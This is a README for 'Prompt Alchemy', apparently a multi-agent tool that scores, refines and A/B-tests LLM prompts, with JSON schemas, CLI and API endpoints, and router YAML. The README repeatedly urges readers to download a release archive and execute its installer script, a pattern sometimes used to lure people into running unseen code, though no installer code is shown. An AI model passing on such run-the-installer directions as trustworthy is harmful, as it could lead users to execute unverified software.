# Prompt Alchemy — Multi-Agent Prompt QA and Refinement
[![Releases](https://img.shields.io/badge/Releases-v1.0-blue?logo=github)](https://github.com/Gautham6/prompt-alchemy/releases)

![Prompt Alchemy Hero](https://images.unsplash.com/photo-1518770660439-4636190af475?ixlib=rb-4.0.3&w=1400&q=80)

Prompt Alchemy evaluates prompt quality, refines underperformers, and delivers actionable feedback. It runs a set of autonomous agents and a smart router. The system grades prompts, runs A/B checks, and refines prompts into production-ready variants. Use it to build safer, clearer, and more effective prompts for Claude, GPT-4, or any LLM.

Badges
- Topics: ai-agents • claude • content-creation • creative-workflows • gpt-4 • json • marketing-tools • multi-agent-system • n8n • prompt-engineering • prompt-library • prompt-management • team-collaboration • workflow-automation
- Releases: https://github.com/Gautham6/prompt-alchemy/releases (download the release file and execute per the instructions below)

Key links
- Releases (download and run): https://github.com/Gautham6/prompt-alchemy/releases

Table of contents
- Features
- How it works
- Agents and roles
- Prompt lifecycle
- Install and run
- Quickstart
- Prompt schema (JSON)
- Integrations
- CLI and API
- Observability and logs
- Contributing
- License

Features ✨
- Multi-agent QA: several agents run distinct checks (clarity, bias, safety, cost).
- Refinement pipeline: failing prompts go through targeted rewrite agents.
- Smart routing: route prompts to best-fit agents based on metadata.
- A/B testing: compare variants against metrics such as relevance, length, and hallucination rate.
- Prompt library: store versions, tags, and performance history in JSON format.
- Team workflows: review, approve, and deploy refined prompts.
- Integrations: Claude, GPT-4, n8n, webhooks, and CI systems.
- Extensible: add custom agents written in Node.js or Python.

How it works 🧭
Prompt Alchemy runs a set of specialized agents. Each agent tests one aspect of a prompt.

- Ingest: accept prompt payloads via API or CLI.
- Route: the router inspects payload metadata and routes it to the right agent set.
- Evaluate: agents score the prompt against checks. Scores use a unified schema.
- Refine: if a prompt scores below threshold, the refinement agent rewrites it.
- Test: the system runs the refined prompt in simulated runs and compares results.
- Store: the system writes final variants and metrics to the prompt library.
- Deploy: approved prompts move to a deployment list for production use.

Architecture diagram
![Architecture](https://images.unsplash.com/photo-1498050108023-c5249f4df085?ixlib=rb-4.0.3&w=1400&q=80)

Agents and roles 🤖
Prompt Alchemy ships with several agent types out of the box.

- ClarityAgent
  - Measures readability and ambiguity.
  - Returns a clarity score and suggestions.

- SafetyAgent
  - Runs safety checks and policy matches.
  - Flags risky content and suggests mitigations.

- BiasAgent
  - Scans for demographic bias and imbalanced framing.
  - Recommends neutral formulations.

- CostAgent
  - Estimates token cost against chosen LLM.
  - Suggests token reductions or summarization.

- PerformanceAgent
  - Runs sample outputs to detect hallucinations and low relevance.
  - Compares metrics to historical baselines.

- RefinementAgent
  - Takes failing prompts and produces 2–4 variants.
  - Each variant targets a specific weakness.

- Router
  - Maps prompts to agents using rules and ML-based intent classification.
  - Allows per-team routing policies.

Prompt lifecycle 🔁
1. Submit prompt via API, CLI, or UI.
2. Router assigns agents.
3. Agents score prompt and write a report.
4. If any score < threshold, RefinementAgent runs.
5. Refinement outputs go to A/B tests.
6. Human review tags winners or re-iterates.
7. Library stores final version with metadata.

Install and run ▶️
Prerequisites
- Node.js 18+ or Python 3.10+ (both supported for agents)
- Docker (optional for containerized runs)
- An API key for your chosen LLM (Claude/GPT-4)

Download and execute the release
- Visit the Releases page and download the latest release artifact:
  https://github.com/Gautham6/prompt-alchemy/releases
- The release archive contains an installer and run scripts. Download the file and execute the installer inside the extracted folder.

Example:
- Download the .tar.gz or .zip from https://github.com/Gautham6/prompt-alchemy/releases
- Extract and inspect the contents.
- Run the provided installer or run script:
  - On Unix: bash install.sh
  - On Windows: .\install.bat

The release file includes an install script. Run the script to configure dependencies, create default agent configs, and start the service.

Notes on safety: always inspect downloaded scripts before running them.

Configuration
- Copy config/example.env to .env and fill in keys:
  - LLM_PROVIDER=claude|openai
  - LLM_KEY=<your-key>
  - DATABASE_URL=<postgres|sqlite url>
  - AGENT_POOL_SIZE=5
- Start the server with:
  - npm run start
  - or docker-compose up

Quickstart — local test
1. Start the service.
2. Submit a prompt:
{
  "prompt_id": "marketing-headline-v1",
  "text": "Write a product headline for a wearable health tracker",
  "metadata": {
    "team": "marketing",
    "priority": "low",
    "llm": "gpt-4"
  }
}
3. The Router sends the prompt to ClarityAgent and PerformanceAgent.
4. Agents return scores and comments.
5. If the prompt fails, RefinementAgent returns 3 variants.
6. The system runs A/B tests and shows metrics in the UI.

Prompt schema (JSON) 📦
Store prompts and results in this schema. The schema supports versioning and metadata.

Prompt object sample
{
  "id": "prompt-001",
  "version": "1.0.0",
  "text": "Summarize the quarterly report for a non-technical audience.",
  "owner": "finance",
  "tags": ["summary","finance","audience:non-technical"],
  "created_at": "2025-02-15T12:00:00Z",
  "thresholds": {
    "clarity": 0.7,
    "safety": 0.9,
    "bias": 0.8
  }
}

Evaluation result sample
{
  "prompt_id": "prompt-001",
  "run_id": "run-20250215-01",
  "scores": {
    "clarity": 0.62,
    "safety": 0.95,
    "bias": 0.85,
    "performance": 0.70
  },
  "agent_reports": {
    "ClarityAgent": {
      "comments": ["Text is long; break into steps."],
      "suggestions": ["Ask for shorter deliverable."]
    }
  },
  "refinements": [
    {
      "variant_id": "v1",
      "text": "Summarize the quarterly report in three short bullets for a general reader."
    }
  ],
  "status": "refined"
}

Integrations and connectors 🔌
- Claude: use Claude API connector; configure in .env.
- GPT-4: configure OpenAI key and model name.
- n8n: use HTTP webhook nodes to trigger runs and collect results.
- CI/CD: use GitHub Actions or GitLab pipelines to run regression tests on prompt changes.
- Webhooks: subscribe to events (refinement-ready, deploy-ready).

Examples of workflows
- Marketing: validate A/B headline prompts, pick winner, publish to ad tool.
- Support: refine troubleshooting prompts to reduce hallucinations.
- Product: craft product description prompts that match brand voice.

CLI and API 🛠
- CLI
  - prompt-alchemy submit --file prompt.json
  - prompt-alchemy eval --id prompt-001
  - prompt-alchemy list --status refined

- REST API
  - POST /api/v1/prompts — submit prompt
  - GET /api/v1/prompts/:id — fetch prompt data
  - POST /api/v1/prompts/:id/evaluate — force evaluation
  - GET /api/v1/library — prompt library

Observability and logs 📊
- Each agent logs events with structured JSON.
- The system emits metrics:
  - average_clarity
  - average_refinements
  - prompt_turnaround_seconds
- Use Prometheus to scrape metrics.
- Ship logs to your ELK stack or to a local file for development.

Scaling and deployment
- Run agents in a worker pool.
- Use RabbitMQ or Redis Streams for task routing.
- Use Docker to containerize agents.
- Use a single, central Router or shard by team for scale.

Extending agents
- Agents follow a simple interface:
  - input: { prompt, metadata }
  - output: { score, comments, suggestions }
- Implement new agents in Node.js or Python.
- Add the agent to the router config with a routing rule.

Prompt governance
- Tag prompts with team ownership and environment (dev, staging, prod).
- Use review flows before a prompt reaches production.
- Keep a changelog per prompt version in the library.

Testing and validation
- Unit test agents with synthetic prompts.
- Create regression suites that run prompts and compare metrics over time.
- Use seed data in tests to hold baselines.

Sample YAML for router rules
router:
  - match:
      team: marketing
    agents:
      - ClarityAgent
      - PerformanceAgent
  - match:
      tag: "sensitive"
    agents:
      - SafetyAgent
      - BiasAgent

Security
- Store LLM keys in secrets manager.
- Use least privilege for DB accounts.
- Inspect releases before running installer. The release includes an installer file that you must download and execute from the Releases page:
  https://github.com/Gautham6/prompt-alchemy/releases

Maintainers and contributors
- Core team: maintainers add agents, fix bugs, and review PRs.
- Contributor guide: fork, branch, implement tests, and open a pull request.
- Use semantic commit messages and follow our CODE_OF_CONDUCT.

Files in release
- The release archive includes:
  - install.sh / install.bat
  - docker-compose.yml
  - configs/example.env
  - agents/ (sample agents)
  - cli/
  - docs/

License
- MIT

Resources and links
- Releases and downloads: https://github.com/Gautham6/prompt-alchemy/releases
- Issue tracker: use GitHub Issues
- Discussions: use Discussions tab on the repo

Images and assets
- Use the assets folder for diagrams and screenshots.
- Replace sample images with your team visuals before production.

Get started
- Download a release from https://github.com/Gautham6/prompt-alchemy/releases
- Inspect the installer and config files
- Run the installer and start the service
- Submit a prompt and watch the agents evaluate and refine

README last update: 2025-08-19